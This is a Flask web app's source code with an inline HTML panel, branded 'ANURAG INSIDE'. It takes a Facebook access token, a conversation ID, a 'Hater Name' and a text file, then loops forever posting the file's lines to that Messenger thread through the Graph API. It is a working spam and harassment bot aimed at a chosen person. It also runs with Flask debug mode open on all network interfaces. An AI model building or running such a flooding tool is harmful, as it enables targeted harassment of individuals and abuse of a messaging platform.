from flask import Flask, request, redirect, url_for
import requests
import time
import threading

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        def start_bot():
            while True:
                try:
                    for message1 in messages:
                        api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                        message = str(mn) + ' ' + message1
                        parameters = {'access_token': access_token, 'message': message}
                        response = requests.post(api_url, data=parameters, headers=headers)
                        if response.status_code == 200:
                            print(f"✅ Sent → {message}")
                        else:
                            print(f"❌ Failed → {message}")
                        time.sleep(time_interval)
                except Exception as e:
                    print(f"⚠ Error while sending → {message}")
                    print(e)
                    time.sleep(30)

        threading.Thread(target=start_bot, daemon=True).start()

        # ✅ Form submit ke baad success page par bhej do
        return redirect(url_for('success'))

    return """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ANURAG INSIDE SERVER</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
      overflow-x: hidden;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      color: #fff;
    }
    #bg-video {
      position: fixed;
      right: 0;
      bottom: 0;
      min-width: 100%;
      min-height: 100%;
      object-fit: cover;
      z-index: -1;
    }
    .container{
      max-width: 520px;
      background: rgba(255, 255, 255, 0.08);
      border-radius: 20px;
      padding: 25px;
      box-shadow: 0 0 30px rgba(255, 0, 0, 0.6);
      margin: 30px auto;
      position: relative;
      z-index: 1;
      backdrop-filter: blur(12px);
      -webkit-backdrop-filter: blur(12px);
      border: 1px solid rgba(255,255,255,0.2);
    }
    .header h1{
      font-size: 28px;
      font-weight: bold;
      background: linear-gradient(90deg, #ff004c, #ff7300);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-align: center;
      text-shadow: 2px 2px 10px rgba(255,0,0,0.9);
    }
    label{
      font-weight: bold;
      color: #ffcc66;
    }
    .form-control{
      border-radius: 8px;
      background: rgba(0,0,0,0.3);
      color: #fff;
      border: 1px solid rgba(255,255,255,0.3);
    }
    .form-control:focus{
      box-shadow: 0 0 10px rgba(255, 100, 0, 0.8);
      outline: none;
    }
    .btn-submit{
      width: 100%;
      margin-top: 15px;
      padding: 12px;
      font-size: 16px;
      font-weight: bold;
      background: linear-gradient(90deg, #ff004c, #ff7300);
      border: none;
      border-radius: 10px;
      color: #fff;
      box-shadow: 0 0 15px rgba(255,0,0,0.6);
      transition: all 0.3s ease-in-out;
    }
    .btn-submit:hover{
      transform: scale(1.05);
      box-shadow: 0 0 25px rgba(255, 80, 0, 1);
    }
    .footer{
      text-align: center;
      margin-top: 20px;
      color: #ffebcd;
      text-shadow: 1px 1px 8px rgba(0,0,0,1);
    }
  </style>
</head>
<body>
  <video autoplay muted loop playsinline id="bg-video">
    <source src="https://files.catbox.moe/dsqa53.mp4" type="video/mp4">
  </video>

  <header class="header mt-4">
    <h1>🔥 ANURAG INSIDE SYSTEM PANEL 🔥</h1>
  </header>

  <div class="container">
    <form action="/" method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="accessToken">Enter Your Token:</label>
        <input type="text" class="form-control" id="accessToken" name="accessToken" required>
      </div>
      <div class="mb-3">
        <label for="threadId">Enter Convo/Inbox ID:</label>
        <input type="text" class="form-control" id="threadId" name="threadId" required>
      </div>
      <div class="mb-3">
        <label for="kidx">Enter Hater Name:</label>
        <input type="text" class="form-control" id="kidx" name="kidx" required>
      </div>
      <div class="mb-3">
        <label for="txtFile">Select Your Notepad File:</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
      </div>
      <div class="mb-3">
        <label for="time">Speed in Seconds:</label>
        <input type="number" class="form-control" id="time" name="time" required>
      </div>
      <button type="submit" class="btn btn-submit">🚀 START ANURAG INSIDE</button>
    </form>
  </div>

  <footer class="footer">
    <p>&copy; 2025 🔥 ANURAG INSIDE 🔥 All Rights Reserved</p>
    <p>⚡ POWERED BY SYSTEM FUCKER PANEL ⚡</p>
  </footer>
</body>
</html>"""

# ✅ Success Page
@app.route('/success')
def success():
    return """
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <title>Bot Started ✅</title>
      <style>
        body {
          font-family: Arial, sans-serif;
          background: linear-gradient(135deg,#00b09b,#96c93d);
          color: white;
          text-align: center;
          height: 100vh;
          display: flex;
          justify-content: center;
          align-items: center;
          flex-direction: column;
        }
        h1 { font-size: 2.5rem; }
        p { font-size: 1.2rem; }
        .btn {
          margin-top: 20px;
          text-decoration: none;
          background: white;
          color: #00b09b;
          padding: 12px 25px;
          border-radius: 30px;
          font-weight: bold;
        }
      </style>
    </head>
    <body>
      <h1>✅ Bot Started Successfully!</h1>
      <p>Your bot is running in the background.</p>
      <a href="/" class="btn">⬅ Back to Panel</a>
    </body>
    </html>
    """

if __name__ == '__main__':
    print("⎯⎯⎯⎯⎯⎯⎯⎯⚡ ANURAG INSIDE ⚡⎯⎯⎯⎯⎯⎯⎯⎯")
    print("🚀 SERVER IS RUNNING → http://0.0.0.0:5000 ✅")
    print("🔥 PANEL POWERED BY ANURAG INSIDE 🔥")
    print("⎯⎯⎯⎯⎯⎯⎯⎯⚡ SYSTEM ONLINE ⚡⎯⎯⎯⎯⎯⎯⎯⎯")
    app.run(host='0.0.0.0', port=5000, debug=True)
